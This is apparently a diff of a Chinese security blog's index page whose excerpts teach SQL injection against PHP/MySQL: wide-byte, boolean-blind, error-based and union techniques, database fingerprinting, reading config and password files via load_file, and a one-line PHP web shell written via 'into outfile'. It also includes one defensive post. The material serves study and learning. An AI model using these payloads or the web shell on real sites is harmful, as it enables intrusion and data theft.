@@ -89,11 +89,12 @@
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2016-06-24</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -119,7 +120,8 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 应用场景  在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quotes_gpc，或者使用addslashes、mysql_real_escape_string等函数对客户端传入的参数进行过滤，则注入的单引号或双引号就会被&quot;\&quot;转义，但是，如果服务端的数据库使用的是GB2312、GBK、GB18030等宽字节的编码时，则依然会造成注入。   0x01 测试代码  &lt;?php $conn = mysql_connect('localhost','root','root'); mysql_select_db('messages',$conn); if (isset($_GET['id'])) { $id = addslashes($_GET['id']); //转义id $sql = &quot;select * from msg where id='$id';&quot;; echo $sql.&quot;&lt;br /&gt;&quot;; $result = mysql_query($sql); $rows = @mysql_fetch_assoc($result); if ($rows) { echo '&lt;table align=&quot;left&quot; border=&quot;1&quot;&gt;'; foreach ($rows as $key =&gt; $value) { echo '&lt;tr align=&quot;lift&quot; height=&quot;30&quot;&gt;'; echo '&lt;td&gt;'.$key.'----'.$value.'&lt;/td&gt;'; echo '&lt;/tr&gt;'; } echo '&lt;/table&gt;'; } else { echo mysql_error(); } } else { echo &quot;please input id.
+        0x00 应用场景 在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quotes_gpc，或者使用addslashes、mysql_real_escape_string等函数对客户端传入的参数进行过滤，则注入的单引号或双引号就会被&quot;\&quot;转义，但是，如果服务端的数据库使用的是GB2312、GBK、GB18030等宽字节的编码时，则依然会造成注入。
+0x01 测试代码 &lt;?php $conn = mysql_connect('localhost','root','root'); mysql_select_db('messages',$conn); if (isset($_GET['id'])) { $id = addslashes($_GET['id']); //转义id $sql = &quot;select * from msg where id='$id';&quot;; echo $sql.&quot;&lt;br /&gt;&quot;; $result = mysql_query($sql); $rows = @mysql_fetch_assoc($result); if ($rows) { echo '&lt;table align=&quot;left&quot; border=&quot;1&quot;&gt;'; foreach ($rows as $key =&gt; $value) { echo '&lt;tr align=&quot;lift&quot; height=&quot;30&quot;&gt;'; echo '&lt;td&gt;'.$key.'----'.$value.'&lt;/td&gt;'; echo '&lt;/tr&gt;'; } echo '&lt;/table&gt;'; } else { echo mysql_error(); } } else { echo &quot;please input id.
     </p>
 
     
@@ -142,11 +144,12 @@
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2016-06-23</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -172,10 +175,11 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 要做的事  也就是找到注入点然后修复   0x01 防御方法  使用转义函数
+        0x00 要做的事 也就是找到注入点然后修复
+0x01 防御方法  使用转义函数
 如：addslashes()和mysql_real_escape_string()
 在php.ini设置auto_prepend_file自动在脚本执行前在首部加载文件
-   &lt;?php //简单过滤 $filter = array(&amp;$_GET,&amp;$_POST,&amp;$_COOKIE); foreach ($filter as $key =&gt; $value){ foreach ($value as $k =&gt; $v){ $filter[$key][$k] = mysql_real_escape_string($v); } } ?&gt;    检查数据类型
+&lt;?php //简单过滤 $filter = array(&amp;$_GET,&amp;$_POST,&amp;$_COOKIE); foreach ($filter as $key =&gt; $value){ foreach ($value as $k =&gt; $v){ $filter[$key][$k] = mysql_real_escape_string($v); } } ?&gt;  检查数据类型
 使用(int)或settype()等将数字等进行强制转换
 对邮箱、日期等也进行检查
  使用预编译语句绑定变量(一般为防御SQL注入的最佳方式)
@@ -202,11 +206,12 @@
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2016-06-22</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -232,7 +237,11 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 特点  当页面存在注入，但是没有显示位，且没有用echo &quot;mysql_error()&quot;输出错误信息时可以用， 它一次只能猜测一个字节，速度慢，但是只要存在注入就能用   0x01 利用方式  用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+ 根据返回页面是否相同来得到数据   0x02 注入步骤  找注入点、猜闭合字符 猜解列数、尝试得到显示位 猜数据库名 猜表名 猜列名 猜列值  找到注入点，判断闭合字符   尝试猜解列数，得到显示位   得到数据库名  最终得到第五个数据库名为security   得到表名  最终依次猜的表名为users   得到列名  同理最终得到第2列列名为username，第3列列名为password   得到列值  依次得到为admin4，同理可得其他数据   0x04 附上python脚本  #!
+        0x00 特点 当页面存在注入，但是没有显示位，且没有用echo &quot;mysql_error()&quot;输出错误信息时可以用， 它一次只能猜测一个字节，速度慢，但是只要存在注入就能用  0x01 利用方式 用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+ 根据返回页面是否相同来得到数据  0x02 注入步骤  找到注入点，判断闭合字符  尝试猜解列数，得到显示位  得到数据库名 最终得到第五个数据库名为security
+ 得到表名 最终依次猜的表名为users
+ 得到列名 同理最终得到第2列列名为username，第3列列名为password
+ 得到列值 依次得到为admin4，同理可得其他数据
+  0x04 附上python脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber &lt;1070018473@qq.com&gt; __author__=&quot;reber&quot; import sys import requests import binascii import hashlib from pyfiglet import figlet_format from optparse import OptionParser def get_md5_html(url): html = requests.
     </p>
 
     
@@ -255,11 +264,12 @@
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2016-06-22</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -285,12 +295,11 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 前提  一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用， 它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解   0x01 利用方式  count(*)、floor()、rand()、group by不可或缺
-报错注入用一个公式，只要套用公式即可，公式如下(后两个公式有32位的限制):
+        0x00 前提 一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用， 它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解  0x01 利用方式 报错注入只要套用公式即可，公式如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):
 ?id=2&rsquo; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )--+
 ?id=2&rsquo; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+
 ?id=1&rsquo; and extractvalue(1, concat(0x7e, (select @@version),0x7e))--+
- 0x02 公式解析  floor()是取整数 rand()在0和1之间产生一个随机数 rand(0)*2将取0到2的随机数 floor(rand()*2)有两条记录就会报错 floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的 count(*)是用来统计结果的，相当于刷新一次结果 group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1 group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次   0x03 注入步骤  得到闭合字符 猜列数、尝试爆显示位 得到数据库个数和数据库名 得到表个数和表名 得到列数量和列名 得到列值  猜测闭合字符   猜测列数   尝试得到显示位   报错得到数据库个数   报错得到数据库名   报错得到表名   报错得到列名   得到列值   0x04 附上利用代码  #!
+0x02 公式解析 floor()是取整数 rand()在0和1之间产生一个随机数 rand(0)*2将取0到2的随机数 floor(rand()*2)有两条记录就会报错 floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的 count(*)是用来统计结果的，相当于刷新一次结果 group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1 group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次  0x03 注入步骤  猜测闭合字符  猜测列数  尝试得到显示位  报错得到数据库个数  报错得到数据库名  报错得到表名  报错得到列名  得到列值   0x04 附上利用代码 #!
     </p>
 
     
@@ -313,11 +322,12 @@
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2016-06-21</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -343,7 +353,9 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         0x00 前提  要用联合查询进行注入则：页面必须有显示位   0x01 联合查询  union可合并两个或多个select语句的结果集， 前提是两个select必有相同列、且各列的数据类型也相同   0x02 注入步骤  找注入点且得到闭合字符 判断数据库类型 猜解列数，得到显示位 得到基本信息(如：数据库名、数据库版本、当前数据库名等) 得到数据库名 得到表名 得到列名 得到列值  1. 找到注入点得到闭合字符   2. 判断数据库类型   3. 猜解列数，得到显示位   4. 得到基本信息(数据库名、版本、数据库版本等)   5. 得到数据库   6. 得到security数据库的表名   7. 猜解列名   8. 猜解数据   
+         0x00 前提 要用联合查询进行注入则：页面必须有显示位
+0x01 联合查询 union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同
+0x02 注入步骤  找到注入点得到闭合字符  判断数据库类型  猜解列数，得到显示位  得到基本信息(数据库名、版本、数据库版本等)  得到数据库  得到security数据库的表名  猜解列名  猜解数据   
     </p>
 
     
@@ -362,11 +374,12 @@
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2016-06-20</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -392,9 +405,15 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 load_file()  条件:   1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码    一般步骤
- 读/etc/init.d下的东西，这里有配置文件路径   ?id=1' union select 1,2,load_file('/etc/init.d/httpd')    得到web安装路径
-   ?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')    读取密码文件   ?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')    0x01 into outfile  条件：   1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号    一般方法   当知道路径时，可以直接用?
+        0x00 load_file()  条件:  1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
+ 读/etc/init.d下的东西，这里有配置文件路径
+?id=1' union select 1,2,load_file('/etc/init.d/httpd')  得到web安装路径
+?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')  读取密码文件
+?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')    0x01 into outfile  条件：  1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号   一般方法
+当知道路径时，可以直接用?id=1 union select &ldquo;&lt;?php @eval($_POST[&lsquo;c&rsquo;]);?&gt;&rdquo; into outfile(&ldquo;C:/phpStudy/WWW/a.php&rdquo;)
+ 其他方法
+ 登陆phpMyAdmin
+use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库中创建一个表aaa insert into aaa values(&quot;&lt;?
     </p>
 
     
@@ -417,11 +436,12 @@
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2016-06-19</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -447,9 +467,16 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         0x01 扫描端口 0x02 指纹信息 0x03 在URL后面直接判断  Access: and (select count(*) from MSysAccessObjects)&gt;0 返回正常说明是access and exists(select count(*) from 表) SQLserver: and (select count(*) from sysobjects) &gt;0 返回正常说明是mssql MySQL: and length(user())&gt;0 返回正常说明是MySQL   0x04 其他方法  在mssql中可以调用substring。oracle则只可调用substr   
+        0x00 常见手段 扫描端口、指纹、抓包查看http头信息、在网址后面直接判断
+0x01 根据各数据库特有函数判断  Access:
+and (select count(*) from MSysAccessObjects)&gt;0 返回正常说明是access and exists(select count(*) from表) ID=1 and (select count (*) from sysobjects)&gt;0 返回异常 ID=1 and (select count (*) from msysobjects)&gt;0返回异常  SQLServer:
+and (select count(*) from sysobjects) &gt;0 返回正常说明是mssql ID=1 and (select count (*) from sysobjects)&gt;0 返回正常 ID=1 and (select count (*) from msysobjects)&gt;0返回异常 ID=1 and left(version(),1)=5%23 //红色字体也可能是4 ID=1 and exists(select id from sysobjects) ID=1 and len(user)&gt;0 ID=1 CHAR(97)+CHAR(110)+CHAR(100)+CHAR(32)+CHAR(49)+CHAR(61)+CHAR(49)  MySQL:
     </p>
 
+    
+    <footer>
+        <a href="/posts/injection-of-check-database-type/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
     
 </article>
 
@@ -466,11 +493,12 @@
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2016-06-19</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -496,7 +524,7 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         0x00 information_schema  information_schema这这个数据库中保存了MySQL服务器所有数据库的信息。 如数据库名，数据库的表，表栏的数据类型与访问权限等。 再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表， 每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。 information_schema的表schemata中的列schema_name记录了所有数据库的名字 information_schema的表tables中的列table_schema记录了所有数据库的名字 information_schema的表tables中的列table_name记录了所有数据库的表的名字 information_schema的表columns中的列table_schema记录了所有数据库的名字 information_schema的表columns中的列table_name记录了所有数据库的表的名字 information_schema的表columns中的列column_name记录了所有数据库的表的列的名字   0x01 information_schema的SCHEMATA表   0x02 information_schema的TABLES表   0x03 information_schema的COLUMNS表   
+         0x00 information_schema information_schema这这个数据库中保存了MySQL服务器所有数据库的信息。 如数据库名，数据库的表，表栏的数据类型与访问权限等。 再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表， 每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。 information_schema的表schemata中的列schema_name记录了所有数据库的名字 information_schema的表tables中的列table_schema记录了所有数据库的名字 information_schema的表tables中的列table_name记录了所有数据库的表的名字 information_schema的表columns中的列table_schema记录了所有数据库的名字 information_schema的表columns中的列table_name记录了所有数据库的表的名字 information_schema的表columns中的列column_name记录了所有数据库的表的列的名字  0x01 information_schema的SCHEMATA表 0x02 information_schema的TABLES表 0x03 information_schema的COLUMNS表 
     </p>
 
     
@@ -515,11 +543,12 @@
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2016-06-19</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -545,7 +574,9 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 含义  sql注入是将代码插入(拼接)到应用(用户)的输入参数中， 之后再将这些参数传递给后台的SQL服务器加以解析并执行的攻击， 总结起来就是攻击者将恶意代码拼接到sql语句并加以执行从而得到数据的过程。   0x01 成因  SQl语句未对用户参数进行严格过滤   0x02 可引发注入的地方  其实只要是客户端可控、参数值代入数据库查询的地方都可能存在注入 常见的如下，按出现频率排序： 1. GET 2. POST 3. X-Forwarded-For 4. Cookie 5. User-Agent   0x03 注入分类  根据语法(较权威)： 1. 可联合查询注入: 只要页面有显示位即可使用，且注入速度很快 2. 报错型注入: 没有显示位但用echo &quot;mysql_error()&quot;输出了错误信息，速度很快，但是语句较复杂 3. 布尔型注入: 一次一个字节，速度慢，但只要有注入就能用 4. 基于时间延迟注入: 超级慢，比布尔型注入慢几倍，但是通用性较强 5. 可多语句查询: 只有SQL Server可以使用 根据类型： 1. 整形 2. 字符串型 3. 搜索型   0x04 查找注入点  在URL中： 1. and 1=1/and 1=2(整型) 2.
+        0x00 含义 sql注入是将代码插入(拼接)到应用(用户)的输入参数中，之后再将这些参数传递给后台的SQL服务器加以解析并执行的攻击，
+总结起来就是攻击者将恶意代码拼接到sql语句并加以执行从而得到数据的过程。
+0x01 成因 SQl语句未对用户参数进行严格过滤  0x02 可引发注入的地方 其实只要是客户端可控、参数值代入数据库查询的地方都可能存在注入 常见的如下，按出现频率排序： 1. GET 2. POST 3. X-Forwarded-For 4. Cookie 5. User-Agent  0x03 注入分类 根据语法(较权威)： 1. 可联合查询注入: 只要页面有显示位即可使用，且注入速度很快 2. 报错型注入: 没有显示位但用echo &quot;mysql_error()&quot;输出了错误信息，速度很快，但是语句较复杂 3. 布尔型注入: 一次一个字节，速度慢，但只要有注入就能用 4. 基于时间延迟注入: 超级慢，比布尔型注入慢几倍，但是通用性较强 5. 可多语句查询: 只有SQL Server可以使用 根据类型： 1. 整形 2. 字符串型 3. 搜索型  0x04 查找注入点 在URL中： 1. and 1=1/and 1=2(整型) 2. 随即输入(整型) 3. -1/+1 回显上下页面(整型) 4. 单引号(字符型/整型) 5. and sleep(5) (判断页面返回时间) 在http头： 1.
     </p>
 
     
@@ -568,11 +599,12 @@
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2016-06-19</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -598,7 +630,7 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         针对单台服务器的渗透流程 
+         针对单台服务器的渗透流程 
     </p>
 
     
